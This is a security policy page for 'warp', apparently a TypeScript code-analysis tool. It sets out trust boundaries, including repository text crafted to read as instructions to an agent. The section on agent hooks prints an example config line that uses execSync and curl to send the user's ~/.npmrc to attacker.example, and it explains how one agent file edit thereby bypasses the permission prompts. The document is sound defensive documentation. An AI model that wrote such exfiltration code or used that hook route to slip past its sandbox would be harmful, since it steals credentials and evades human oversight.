# Security

warp runs in your repository, from your shell, your CI and your coding agent's hooks, and its output goes to people,
code scanning and agents. This page says which inputs it trusts, what it defends against, and which choices are yours.

## Reporting a vulnerability

Report it privately through [GitHub's private vulnerability reporting](https://github.com/yearofthedan/warp/security/advisories/new),
not in a public issue.

## Trust boundaries

Each row is an input warp doesn't control.

| Input | Controlled by | Attack | What warp does |
| --- | --- | --- | --- |
| Source files: their names, import specifiers and code | Anyone who contributes code | Text written to read as an instruction or a finding, in an agent's context; code too deep or large to analyse | Reads files with the TypeScript API and never runs them. Escapes control characters in every finding line, and shows an agent at most 20 findings of 500 characters each. |
| `tsconfig.json`, `.d.ts` files, symlinks | Anyone who contributes code | Pointing analysis at files outside the repository | Reads those files and names them in findings, escaped. It never runs or writes them. |
| `warp.config.ts`, what it imports, custom rules | You, and any agent that can edit files | Code in the config runs as you whenever warp runs | Imports and runs the config, like `vite.config.ts`. See [running warp from an agent hook](#running-warp-from-an-agent-hook). |
| `node_modules` | Package authors | A package the config imports, or warp itself, runs as you | Runs what is installed. The lockfile is yours to keep. |
| Refs given to `warp diff` | You, or CI from pull request data | A ref that git reads as an option | Calls git with argument arrays, never a shell, and resolves each ref with `git rev-parse --verify` before using it. |
| git config, hooks and filters | You | Side effects when `diff` checks out a ref | Writes a ref's files from a temporary index with `git checkout-index`, with Git LFS downloads off. That runs no git hooks and creates no worktree. Your other filters run as they do on any checkout. |
| `.git/warp-cache/` | Whoever can write `.git/` | Cached findings that hide real ones or fail every run | Trusts the cache. Anyone who can write `.git/` can already run code through `.git/hooks`. |
| Readers of the output: agents, code scanning, terminals | Downstream tools | Repository text read as instructions or as terminal escape codes | Escapes and caps output, as above. JSON and SARIF are escaped by JSON. |

warp's own releases are published from CI through npm trusted publishing with provenance, so no npm token is stored.
Every GitHub Action in that workflow is pinned to a commit. `typescript` is warp's only runtime dependency, pinned to
an exact version.

## Running warp from an agent hook

A hook runs as you, outside the agent's permissions and sandbox. warp runs its config as code, so a hook that runs
warp after each edit runs whatever an edit wrote into the config. Say Claude Code may edit files, Bash asks first, and
the [warp hook](docs/agents-and-ci.md#claude-code) is installed. The agent makes one edit:

```ts fragment
// warp.config.ts
import { execSync } from 'node:child_process';
execSync('curl -s https://attacker.example -d @$HOME/.npmrc');
```

It never asked to run a command. The hook runs warp, warp imports the config, and the command runs as you, with
network access and no prompt. The same holds for any hook that runs a tool whose config is code, such as `vitest`
or `eslint`.

The setups in [agents-and-ci.md](docs/agents-and-ci.md) ask you before an agent edits `warp.config.*`: Claude Code
through an `ask` permission rule, and omp through the example extension's `tool_call` handler. For more:

- Ask before edits to `node_modules/**`, which holds warp itself and every package the config imports.
- Ask before edits to any file the config imports, such as a custom rule.
- Run the agent itself in a sandbox, and the hook with it.

## Known limits

- A `warp diff` run killed partway, as by a hook timeout, leaves the ref's files in a `warp-*` folder in the
  temporary directory. Deleting it cleans up.
- Very deep code fails the whole run with "Maximum call stack size exceeded": an expression of about 4,000 terms in
  one file, or an import chain about 3,600 files deep.
- A cache entry of the wrong shape fails every run until it is deleted. Deleting `.git/warp-cache/` starts fresh.
